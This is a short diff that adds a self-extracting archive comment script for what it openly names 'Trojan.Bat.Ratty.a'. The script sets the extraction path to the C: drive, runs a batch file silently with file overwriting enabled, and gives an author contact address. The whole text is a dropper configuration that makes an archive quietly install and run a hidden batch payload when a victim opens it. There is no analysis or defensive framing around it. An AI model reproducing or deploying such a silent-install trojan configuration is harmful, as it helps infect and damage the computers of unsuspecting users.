@@ -1,0 +1,12 @@
+;The comment below contains SFX script commands
+
+Path=c:\
+Setup=Muie.bat
+Presetup=General.txt
+Silent=1
+Overwrite=1
+Title=Welcome 2 Trojan.Bat.Ratty.a
+Text
+{
+contact me at : ratty2001ro@yahoo.com
+}
